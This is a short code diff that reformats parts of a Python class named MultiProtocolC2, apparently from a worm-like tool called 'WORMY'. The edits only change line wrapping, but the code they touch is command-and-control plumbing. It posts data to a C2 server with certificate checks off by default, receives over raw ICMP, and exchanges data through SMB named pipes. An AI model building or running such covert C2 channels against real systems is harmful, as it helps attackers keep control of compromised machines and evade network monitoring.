@@ -333,7 +333,11 @@ class MultiProtocolC2:
             headers = {"X-API-Key": self.api_key} if self.api_key else {}
 
             response = requests.post(
-                url, data=data, headers=headers, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1"
+                url,
+                data=data,
+                headers=headers,
+                timeout=10,
+                verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1",
             )
 
             if response.status_code == 200:
@@ -422,7 +426,11 @@ class MultiProtocolC2:
             # Wait for response
             try:
                 response, addr = sock.recvfrom(1024)
-                return {"status": "success", "data": response.decode("utf-8", errors="ignore"), "protocol": "ICMP"}
+                return {
+                    "status": "success",
+                    "data": response.decode("utf-8", errors="ignore"),
+                    "protocol": "ICMP",
+                }
             except socket.timeout:
                 return {"status": "timeout", "protocol": "ICMP"}
             finally:
@@ -454,7 +462,11 @@ class MultiProtocolC2:
                 conn.writeFile(tid, fid, data)
                 response = conn.readFile(tid, fid, 0, 1024)
                 conn.closeFile(tid, fid)
-                return {"status": "success", "data": response.decode("utf-8", errors="ignore"), "protocol": "SMB"}
+                return {
+                    "status": "success",
+                    "data": response.decode("utf-8", errors="ignore"),
+                    "protocol": "SMB",
+                }
             except Exception:
                 return {"status": "pipe_unavailable", "protocol": "SMB"}
             finally:
